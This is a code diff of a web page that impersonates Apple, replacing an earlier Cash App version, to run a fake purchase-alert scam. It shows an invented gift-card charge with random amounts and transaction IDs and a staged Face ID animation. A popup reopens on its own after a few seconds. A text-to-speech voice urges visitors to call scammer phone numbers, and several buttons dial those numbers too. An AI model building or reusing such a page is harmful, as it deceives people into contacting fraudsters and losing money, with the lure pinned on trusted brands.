+rgba(255,255,255,.04);
+
+border:
+1px solid rgba(255,255,255,.05);
+
+border-radius:24px;
+
+padding:22px;
+
+line-height:2.1;
+
+font-size:15px;
+
+margin-bottom:24px;
+
+}
+
+.info b{
+
+color:#fff;
+
+}
+
+/* =====================================
+   BUTTONS
+===================================== */
+
+.btn{
+
+width:100%;
+
+padding:16px;
+
+border:none;
+
+border-radius:18px;
+
+font-size:16px;
+font-weight:700;
+
+cursor:pointer;
+
+transition:.25s ease;
+
+}
+
+.primary{
+
+background:
+linear-gradient(
+180deg,
+#3a3a3c,
+#1c1c1e
+);
+
+color:#ffffff;
+
+border:
+1px solid rgba(255,255,255,.08);
+
+box-shadow:
+0 10px 25px rgba(0,0,0,.35);
+
+}
+
+
+.primary:hover{
+
+transform:translateY(-2px);
+
+}
+
+.secondary{
+
+margin-top:12px;
+
+background:
+linear-gradient(
+135deg,
+#f5f5f7 0%,
+#d6d6d8 35%,
+#ffffff 50%,
+#d6d6d8 65%,
+#f5f5f7 100%
+);
+
+color:#111111;
+
+font-weight:700;
+
+border:
+1px solid rgba(255,255,255,.45);
+
+box-shadow:
+0 10px 24px rgba(255,255,255,.10);
+
+}
+
+
+/* =====================================
+   DASHBOARD START
+===================================== */
+
+.page2{
+
+max-width:1200px;
+
+margin:40px auto;
+
+padding:0 20px;
+
+}
+
+.box{
+
+background:
+linear-gradient(
+180deg,
+#1c1c1e,
+#151515
+);
+
+border:
+1px solid rgba(255,255,255,.05);
+
+border-radius:30px;
+
+padding:28px;
+
+margin-bottom:24px;
+
+box-shadow:
+0 15px 40px rgba(0,0,0,.45);
+
+}
+
+.top{
+
+display:flex;
+
+justify-content:space-between;
+
+gap:20px;
+
+flex-wrap:wrap;
+
+}
+
+.amount{
+
+font-size:58px;
+
+font-weight:800;
+
+letter-spacing:-2px;
+
+}
+
+.small{
+
+color:#8e8e93;
+
+font-size:13px;
+
+letter-spacing:.4px;
+
+}
+
+/* =====================================
+   SUMMARY BADGE
+===================================== */
+
+.summary-badge{
+
+display:flex;
+
+align-items:center;
+
+gap:10px;
+
+width:max-content;
+
+margin-top:15px;
+
+padding:10px 16px;
+
+border-radius:999px;
+
+background:
+rgba(52,199,89,.08);
+
+border:
+1px solid rgba(52,199,89,.15);
+
+}
+
+/* =====================================
+   MOBILE
+===================================== */
+
+@media(max-width:768px){
+
+.modal{
+
+padding:12px;
+
+padding-top:20px;
+
+overflow-y:auto;
+
+}
+
+.modal-box{
+
+padding:18px;
+
+border-radius:24px;
+
+}
+
+.heading{
+
+font-size:30px;
+
+}
+
+.card-preview{
+
+height:180px;
+
+}
+
+.card-amount{
+
+font-size:36px;
+
+}
+
+.amount{
+
+font-size:42px;
+
+}
+
+.page2{
+
+padding:0 12px;
+
+}
+
+.box{
+
+padding:18px;
+
+}
+
+}
+
+.apple-watermark{
+
+position:absolute;
+
+right:20px;
+top:20px;
+
+width:120px;
+height:140px;
+
+opacity:.07;
+
+pointer-events:none;
+
+}
+
+.apple-watermark svg{
+
+width:100%;
+height:100%;
+
+display:block;
+
+}
+
+</style>
+
+<!-- PURCHASE REVIEW MODAL -->
+
+<div
+class="modal hidden"
+id="modal">
+
+<div class="modal-box">
+
+<div class="glow"></div>
+
+<div class="card-preview">
+
+<div class="apple-watermark">
+
+<svg viewBox="0 0 17 20" fill="white">
+<path d="M15.03 10.37c-.06-2.5 2.05-3.71 2.14-3.77-1.17-1.71-3-1.94-3.64-1.99-1.54-.16-3.02.91-3.8.91-.79 0-2.02-.89-3.32-.86-1.71.02-3.29.99-4.17 2.53-1.78 3.1-.45 7.68 1.27 10.16.84 1.21 1.83 2.57 3.14 2.52 1.26-.05 1.74-.81 3.26-.81 1.52 0 1.96.81 3.28.79 1.35-.02 2.22-1.23 3.05-2.44.96-1.4 1.35-2.76 1.37-2.83-.03-.02-2.64-1.01-2.68-4.01zm-2.4-6.84c.69-.84 1.15-2 1.02-3.16-1 .04-2.21.67-2.93 1.51-.64.74-1.2 1.92-1.05 3.06 1.12.09 2.27-.57 2.96-1.41z"/>
+</svg>
+
+</div>
+
+<div class="card-title">
+Apple Services
+</div>
+
+<div class="card-amount" id="modalAmount">
+$294
+</div>
+
+</div>
+
+<div class="heading">
+Purchase Review
+</div>
+
+<div class="sub">
+We detected unusual activity associated
+with this digital purchase requiring
+additional verification.
+</div>
+
+<div class="badge-wrap">
+
+<div class="badge">
+
+<div class="dot"></div>
+
+Verification Pending
+
+</div>
+
+</div>
+
+<div
+class="info"
+id="purchaseInfo">
+
+<div>
+<b>ITEM:</b>
+Digital Gift Card
+</div>
+
+<div>
+<b>VALUE:</b>
+$200.00
+</div>
+
+<div>
+<b>STATUS:</b>
+Pending Verification
+</div>
+
+<div>
+<b>REFERENCE:</b>
+<span id="ref"></span>
+</div>
+
+<div>
+<b>DATE:</b>
+<span id="date"></span>
+</div>
+
+<div>
+<b>DEVICE:</b>
+Secure Desktop Session
+</div>
+
+</div>
+
+<button
+class="btn primary"
+onclick="openFull()">
+
+View Purchase Details
+
+</button>
+
+<button
+class="btn secondary"
+onclick="callSupport()">
+
+Contact Support
+1 (808) 372-3347
+
+</button>
+
+</div>
+
+</div>
+
+<!-- =====================================
+     DASHBOARD SECTION
+===================================== -->
+
+<div
+class="page2 hidden"
+id="page2">
+
+<!-- SUMMARY CARD -->
+
+<div class="box">
+
+<div class="top">
+
+<div>
+
+<div class="small">
+DIGITAL PURCHASE SUMMARY
+</div>
+
+<div
+class="amount"
+id="amt">
+
+$200
+
+</div>
+
+<div class="summary-badge">
+
+<div class="dot"></div>
+
+Purchase Verification Active
+
+</div>
+
+</div>
+
+<div style="text-align:right;">
+
+<div class="small">
+PURCHASE REFERENCE
+</div>
+
+<div
+id="ref2"
+style="
+font-size:22px;
+font-weight:700;
+margin-top:10px;
+">
+
+</div>
+
+<div
+class="small"
+style="margin-top:24px;">
+
+LAST UPDATED
+
+</div>
+
+<div
+id="date2"
+style="margin-top:10px;">
+
+</div>
+
+</div>
+
+</div>
+
+</div>
+
+<!-- =====================================
+     PURCHASE DETAILS GRID
+===================================== -->
+
+<div class="box">
+
+<style>
+
+.grid{
+
+display:grid;
+
+grid-template-columns:
+repeat(auto-fit,minmax(240px,1fr));
+
+gap:18px;
+
+}
+
+.grid-box{
+
+background:
+linear-gradient(
+180deg,
+#262629,
+#1f1f22
+);
+
+border:
+1px solid rgba(255,255,255,.05);
+
+border-radius:24px;
+
+padding:22px;
+
+transition:.25s ease;
+
+}
+
+.grid-box:hover{
+
+transform:
+translateY(-3px);
+
+border-color:
+rgba(10,132,255,.25);
+
+}
+
+.grid-title{
+
+font-size:13px;
+
+color:#8e8e93;
+
+margin-bottom:10px;
+
+letter-spacing:.3px;
+
+}
+
+.grid-value{
+
+font-size:19px;
+
+font-weight:700;
+
+line-height:1.4;
+
+}
+
+</style>
+
+<div class="grid">
+
+<div class="grid-box">
+
+<div class="grid-title">
+Purchase Item
+</div>
+
+<div class="grid-value">
+Entertainment Gift Card
+</div>
+
+</div>
+
+<div class="grid-box">
+
+<div class="grid-title">
+Purchase Amount
+</div>
+
+<div
+class="grid-value"
+id="gridAmount">
+
+$200.00
+
+</div>
+
+</div>
+
+<div class="grid-box">
+
+<div class="grid-title">
+Verification Status
+</div>
+
+<div class="grid-value">
+
+<span style="color:#34c759;">
+Review Pending
+</span>
+
+</div>
+
+</div>
+
+<div class="grid-box">
+
+<div class="grid-title">
+Session Type
+</div>
+
+<div class="grid-value">
+Secure Checkout
+</div>
+
+</div>
+
+</div>
+
+</div>
+
+<!-- =====================================
+     RECENT ACTIVITY
+===================================== -->
+
+<div class="box">
+
+<style>
+
+.section-title{
+
+font-size:28px;
+
+font-weight:700;
+
+margin-bottom:24px;
+
+letter-spacing:-.6px;
+
+}
+
+.activity{
+
+display:flex;
+
+justify-content:space-between;
+align-items:center;
+
+padding:18px;
+
+border-radius:22px;
+
+background:
+linear-gradient(
+180deg,
+#262629,
+#1f1f22
+);
+
+border:
+1px solid rgba(255,255,255,.04);
+
+margin-bottom:14px;
+
+transition:.2s ease;
+
+}
+
+.activity:hover{
+
+transform:
+translateY(-2px);
+
+}
+
+.activity-name{
+
+font-size:16px;
+
+font-weight:700;
+
+}
+
+.activity-sub{
+
+font-size:13px;
+
+margin-top:5px;
+
+color:#8e8e93;
+
+}
+
+.activity-amount{
+
+font-size:16px;
+
+font-weight:700;
+
+color:#fff;
+
+}
+
+</style>
+
+<div class="section-title">
+Recent Activity
+</div>
+
+<div id="activity">
+
+<!-- JS injects activities -->
+
+</div>
+
+</div>
+
+<!-- =====================================
+     NEED HELP SECTION
+===================================== -->
+
+<div class="box">
+
+<style>
+
+.help-wrap{
+
+display:flex;
+
+justify-content:space-between;
+align-items:center;
+
+flex-wrap:wrap;
+
+gap:20px;
+
+}
+
+.help-title{
+
+font-size:30px;
+
+font-weight:800;
+
+letter-spacing:-1px;
+
+}
+
+.help-sub{
+
+margin-top:10px;
+
+font-size:15px;
+
+line-height:1.8;
+
+color:#8e8e93;
+
+max-width:560px;
+
+}
+
+.support-btn{
+
+padding:16px 28px;
+
+border:none;
+
+border-radius:18px;
+
+font-size:15px;
+font-weight:700;
+
+cursor:pointer;
+
+background:
+linear-gradient(
+180deg,
+#0a84ff,
+#0066ff
+);
+
+color:#fff;
+
+box-shadow:
+0 12px 30px rgba(0,122,255,.25);
+
+transition:.25s ease;
+
+}
+
+.support-btn:hover{
+
+transform:
+translateY(-2px);
+
+}
+
+</style>
+
+<div class="help-wrap">
+
+<div>
+
+<div class="help-title">
+Need Help?
+</div>
+
+<div class="help-sub">
+
+Contact our purchase verification
+specialists at
+1 (808) 372-3347 for assistance
+regarding this digital transaction,
+account review, or verification
+status.
+
+</div>
+
+</div>
+
+<button
+class="support-btn"
+onclick="callSupport()">
+
+Contact Support
+
+</button>
+
+</div>
+
+</div>
+
+<!-- =====================================
+     APPLE SUPPORT PANEL
+===================================== -->
+
+<div class="box">
+
+<style>
+
+.support-card{
+
+display:flex;
+
+justify-content:space-between;
+align-items:center;
+
+gap:20px;
+
+flex-wrap:wrap;
+
+}
+
+.support-left{
+
+display:flex;
+
+align-items:center;
+
+gap:16px;
+
+}
+
+.phone-icon{
+
+width:54px;
+height:54px;
+
+border-radius:50%;
+
+display:flex;
+
+justify-content:center;
+align-items:center;
+
+background:
+rgba(10,132,255,.12);
+
+}
+
+.support-main{
+
+font-size:16px;
+
+font-weight:700;
+
+}
+
+.support-sub{
+
+margin-top:6px;
+
+font-size:13px;
+
+color:#8e8e93;
+
+}
+
+.call-now{
+
+padding:14px 22px;
+
+border-radius:16px;
+
+border:none;
+
+cursor:pointer;
+
+font-weight:700;
+
+background:#34c759;
+
+color:#fff;
+
+}
+
+</style>
+
+<div class="support-card">
+
+<div class="support-left">
+
+<div class="phone-icon">
+
+📞
+
+</div>
+
+<div>
+
+<div class="support-main">
+
+Didn't recognize this purchase?
+
+</div>
+
+<div class="support-sub">
+
+Call Apple Purchase Support
+• 24/7 Assistance
+
+</div>
+
+</div>
+
+</div>
+
+<button
+class="call-now"
+onclick="callSupport()">
+
+Call Now
+
+</button>
+
+</div>
+
+</div>
+
+<!-- =====================================
+     FOOTER
+===================================== -->
+
+<div class="footer">
+
+<style>
+
+.footer{
+
+padding:30px 10px 80px;
+
+text-align:center;
+
+}
+
+.footer-links{
+
+display:flex;
+
+justify-content:center;
+
+gap:14px;
+
+flex-wrap:wrap;
+
+margin-bottom:16px;
+
+font-size:13px;
+
+color:#8e8e93;
+
+}
+
+.footer-copy{
+
+font-size:12px;
+
+color:#636366;
+
+line-height:1.8;
+
+}
+
+@media(max-width:768px){
+
+.activity{
+
+flex-direction:column;
+align-items:flex-start;
+
+gap:10px;
+
+}
+
+.help-wrap{
+
+flex-direction:column;
+align-items:flex-start;
+
+}
+
+.support-btn,
+.call-now{
+
+width:100%;
+
+}
+
+.support-card{
+
+flex-direction:column;
+align-items:flex-start;
+
+}
+
+}
+
+</style>
+
+<div class="footer-links">
+
+<span>Terms of Use</span>
+
+<span>•</span>
+
+<span>Privacy Policy</span>
+
+<span>•</span>
+
+<span>Billing & Refunds</span>
+
+<span>•</span>
+
+<span>Support</span>
+
+</div>
+
+<div class="footer-copy">
+
+© 2026 Apple Inc. All rights reserved.
+
+<br><br>
+
+Apple Pay and Apple Services are
+trademarks of Apple Inc.
+
+</div>
+
+</div>
+
+<!-- CLOSE PAGE2 -->
+</div>
+
+<!-- CLOSE APP CONTAINER -->
+</div>
+
+<!-- =====================================
+     JAVASCRIPT ENGINE
+===================================== -->
 
 <script>
 
-/* LOADING TEXT */
+/* =====================================
+   GENERATORS
+===================================== */
 
-setTimeout(()=>{
+function randomRef(){
 
-    document.getElementById("loadingText").innerText =
-    "Securing Wallet...";
+return (
+"TXN-" +
+Math.random()
+.toString(36)
+.substring(2,6)
+.toUpperCase() +
 
-},1500);
+"-" +
 
-setTimeout(()=>{
+Math.random()
+.toString(36)
+.substring(2,6)
+.toUpperCase()
 
-    document.getElementById("loadingText").innerText =
-    "Loading Activity...";
-
-},3000);
-
-/* SPLASH TO PIN */
-
-setTimeout(()=>{
-
-    document.getElementById("splash").style.opacity="0";
-
-    setTimeout(()=>{
-
-        document.getElementById("splash").style.display="none";
-
-        const pin =
-        document.getElementById("pinScreen");
-
-        pin.style.opacity="1";
-        pin.style.pointerEvents="all";
-
-    },500);
-
-},4200);
-
-/* AUTO PIN */
-
-setTimeout(()=>{
-
-    document.getElementById("d1").classList.add("active");
-
-},5200);
-
-setTimeout(()=>{
-
-    document.getElementById("d2").classList.add("active");
-
-},5600);
-
-setTimeout(()=>{
-
-    document.getElementById("d3").classList.add("active");
-
-},6000);
-
-setTimeout(()=>{
-
-    document.getElementById("d4").classList.add("active");
-
-},6400);
-
-/* OPEN MAIN */
-
-setTimeout(()=>{
-
-    const pin =
-    document.getElementById("pinScreen");
-
-    pin.style.opacity="0";
-
-    setTimeout(()=>{
-
-        pin.style.display="none";
-
-        document
-		.getElementById("main")
-		.classList.add("show");
-		
-		document.querySelector(".nav").style.display = "flex";
-
-    },500);
-
-},7600);
-
-/* =========================
-   LIVE TIME
-========================= */
-
-function updatePopupTime(){
-
-    const now = new Date();
-
-    const time =
-    now.toLocaleTimeString([],{
-        hour:'numeric',
-        minute:'2-digit'
-    });
-
-    document.getElementById("popupTime").innerText =
-    "Today • " + time;
+);
 
 }
 
-updatePopupTime();
+function formatDate(){
 
-/* =========================
-   RANDOM AMOUNT
-========================= */
+const d = new Date();
 
-const randomAmount =
-Math.floor(Math.random() * 400) + 80;
-
-document.getElementById("popupAmount").innerText =
-"-$" + randomAmount;
-
-/* =========================
-   SHOW POPUP
-========================= */
-
-setTimeout(()=>{
-
-    document
-    .getElementById("popupWrap")
-    .classList.add("show");
-
-    setTimeout(()=>{
-
-        playVerificationAlert();
-
-    },600);
-
-},9800);
-
-/* =========================
-   CLOSE
-========================= */
-
-function closePopup(){
-
-    const popup =
-    document.getElementById("popupWrap");
-
-    popup.classList.remove("show");
-
-    /* subtle chart animation */
-
-    const chart =
-    document.querySelector(".mini-chart");
-
-    chart.style.transform =
-    "scale(.98)";
-
-    chart.style.transition =
-    ".3s ease";
-
-    setTimeout(()=>{
-
-        chart.style.transform =
-        "scale(1)";
-
-    },300);
-
-    /* reopen popup */
-
-    setTimeout(()=>{
-
-        popup.classList.add("show");
-
-    },2500);
+return d.toLocaleString(
+'en-US',
+{
+year:'numeric',
+month:'short',
+day:'2-digit',
+hour:'2-digit',
+minute:'2-digit',
+second:'2-digit'
+}
+);
 
 }
 
-/* =========================
+function generateAmount(){
+
+return Math.floor(
+Math.random()*601
+)+200;
+
+}
+
+/* =====================================
+   GLOBAL DATA
+===================================== */
+
+let purchaseRef = randomRef();
+
+let purchaseDate = formatDate();
+
+let purchaseAmount = generateAmount();
+
+/* =====================================
+   COUNT UP ANIMATION
+===================================== */
+
+function animateAmount(
+element,
+target
+){
+
+let start = 0;
+
+let duration = 1800;
+
+let increment =
+target /
+(duration/16);
+
+const timer =
+setInterval(()=>{
+
+start += increment;
+
+if(start >= target){
+
+start = target;
+
+clearInterval(timer);
+
+}
+
+element.innerText =
+"$" +
+Math.floor(start);
+
+},16);
+
+}
+
+/* =====================================
+   ACTIVITY FEED
+===================================== */
+
+function buildActivities(){
+
+const items = [
+
+"Digital Store",
+"Gift Card Activation",
+"Purchase Verification",
+"Media Purchase",
+"Digital Delivery",
+"Wallet Authorization"
+
+];
+
+let html = '';
+
+items.forEach(item=>{
+
+const value =
+(
+Math.random()*120
++
+20
+).toFixed(2);
+
+html += `
+
+<div class="activity">
+
+<div>
+
+<div class="activity-name">
+
+${item}
+
+</div>
+
+<div class="activity-sub">
+
+Secure Digital Processing
+
+</div>
+
+</div>
+
+<div class="activity-amount">
+
+$${value}
+
+</div>
+
+</div>
+
+`;
+
+});
+
+document
+.getElementById("activity")
+.innerHTML = html;
+
+}
+
+/* =====================================
+   POPULATE PAGE
+===================================== */
+
+function populateData(){
+
+/* modal amount */
+
+document
+.getElementById("modalAmount")
+.innerText =
+"$" +
+purchaseAmount;
+
+/* face amount */
+
+document
+.getElementById("faceAmount")
+.innerText =
+"$" +
+purchaseAmount;
+
+/* dashboard amount */
+
+document
+.getElementById("amt")
+.innerText =
+"$0";
+
+animateAmount(
+document.getElementById("amt"),
+purchaseAmount
+);
+
+/* grid amount */
+
+document
+.getElementById("gridAmount")
+.innerText =
+"$" +
+purchaseAmount +
+".00";
+
+/* references */
+
+document
+.getElementById("ref")
+.innerText =
+purchaseRef;
+
+document
+.getElementById("ref2")
+.innerText =
+purchaseRef;
+
+/* dates */
+
+document
+.getElementById("date")
+.innerText =
+purchaseDate;
+
+document
+.getElementById("date2")
+.innerText =
+purchaseDate;
+
+/* info card */
+
+document
+.getElementById("purchaseInfo")
+.innerHTML =
+
+`
+
+<div>
+
+<b>ITEM:</b>
+
+Digital Gift Card
+
+</div>
+
+<div>
+
+<b>VALUE:</b>
+
+$${purchaseAmount}.00
+
+</div>
+
+<div>
+
+<b>STATUS:</b>
+
+Pending Verification
+
+</div>
+
+<div>
+
+<b>REFERENCE:</b>
+
+<span id="ref">
+
+${purchaseRef}
+
+</span>
+
+</div>
+
+<div>
+
+<b>DATE:</b>
+
+<span id="date">
+
+${purchaseDate}
+
+</span>
+
+</div>
+
+<div>
+
+<b>DEVICE:</b>
+
+Secure Desktop Session
+
+</div>
+
+`;
+
+buildActivities();
+
+}
+
+/* =====================================
+   FACE ID FLOW
+===================================== */
+
+function startFaceID(){
+
+document
+.getElementById("faceIdOverlay")
+.classList
+.remove("hidden");
+
+}
+
+/* =====================================
+   SUCCESS FLASH
+===================================== */
+
+function triggerFlash(){
+
+const flash =
+document.getElementById(
+"flashLayer"
+);
+
+flash.style.animation =
+"none";
+
+void flash.offsetWidth;
+
+flash.style.animation =
+"flashEffect .35s ease-out forwards";
+
+}
+
+/* =====================================
+   SHOW MODAL
+===================================== */
+
+
+
+/* =====================================
+   OPEN FULL DETAILS
+===================================== */
+
+function openFull(){
+
+document
+.getElementById("modal")
+.classList
+.add("hidden");
+
+document
+.getElementById("page2")
+.classList
+.remove("hidden");
+
+/* reopen popup after 4 sec */
+
+setTimeout(()=>{
+
+document
+.getElementById("modal")
+.classList
+.remove("hidden");
+
+},4000);
+
+}
+
+/* =====================================
+   SUPPORT
+===================================== */
+
+function callSupport(){
+
+window.location.href =
+"tel:18083723347";
+
+}
+
+/* =====================================
    VOICE ALERT
-========================= */
+===================================== */
 
 function playVerificationAlert(){
 
-    if(!('speechSynthesis' in window)){
-        return;
-    }
+if(!('speechSynthesis' in window)){
+return;
+}
 
-    window.speechSynthesis.cancel();
+/* stop previous speech */
 
-    const supportNumber =
-    "1 808 372 3347";
+window.speechSynthesis.cancel();
 
-    const message =
+/* number from support button */
 
-    `Crypto transfer alert via Cash App Wallet. Please review the transaction details. If this activity was not authorized by you, contact Cash App support immediately on ${supportNumber}`;
+const supportNumber =
+"+1 844 376 7271";
 
-    const speech =
-    new SpeechSynthesisUtterance(message);
+const message =
 
-    speech.rate = 0.9;
-    speech.pitch = 1;
-    speech.volume = 1;
+`Your current purchase requires verification.
+Please contact customer service immediately
+for more information on
+${supportNumber}`;
 
-    const voices =
-    window.speechSynthesis.getVoices();
+const speech =
+new SpeechSynthesisUtterance(message);
 
-    const preferred =
-    voices.find(v =>
-        v.lang.startsWith('en')
-    );
+/* voice settings */
 
-    if(preferred){
-        speech.voice = preferred;
-    }
+speech.rate = 0.92;
+speech.pitch = 1;
+speech.volume = 0.85;
 
-    window.speechSynthesis.speak(speech);
+/* try to use a natural English voice */
+
+const voices =
+window.speechSynthesis.getVoices();
+
+const preferred =
+voices.find(v =>
+v.lang.startsWith('en')
+);
+
+if(preferred){
+speech.voice = preferred;
+}
+
+window.speechSynthesis.speak(speech);
 
 }
 
-/* =========================
-   LIVE STATUS TIME
-========================= */
+/* =====================================
+   LOADING SEQUENCE
+===================================== */
 
-function updateLiveTime(){
+window.addEventListener(
+"DOMContentLoaded",
+()=>{
 
-    const now = new Date();
+populateData();
 
-    const time =
-    now.toLocaleTimeString([],{
-        hour:'numeric',
-        minute:'2-digit'
-    });
+/* 1 */
 
-    document.getElementById("liveTime").innerText =
-    time;
+setTimeout(()=>{
 
-}
+document
+.getElementById("status")
+.innerText =
+"Authorizing purchase...";
 
-updateLiveTime();
+},1500);
 
-setInterval(updateLiveTime,1000);
+/* 2 */
+
+setTimeout(()=>{
+
+document
+.getElementById("status")
+.innerText =
+"Verification complete";
+
+},3000);
+
+/* 3 */
+
+setTimeout(()=>{
+
+document
+.getElementById("start")
+.style.display =
+"none";
+
+startFaceID();
+
+},4000);
+
+/* 4 */
+
+setTimeout(()=>{
+
+triggerFlash();
+
+},6900);
+
+/* 5 */
+
+setTimeout(()=>{
+
+/* hide face id */
+
+document
+.getElementById("faceIdOverlay")
+.classList
+.add("hidden");
+
+/* show entire app */
+
+document
+.getElementById("appContainer")
+.style.opacity =
+"1";
+
+/* show header */
+
+document
+.getElementById("header")
+.classList
+.remove("hidden");
+
+/* IMPORTANT:
+   show dashboard first
+*/
+
+document
+.getElementById("page2")
+.classList
+.remove("hidden");
+
+/* then popup on top */
+
+document
+.getElementById("modal")
+.classList
+.remove("hidden");
+
+document
+.getElementById("modal")
+.style.display =
+"flex";
+
+},7200);
+
+});
 
 </script>
 
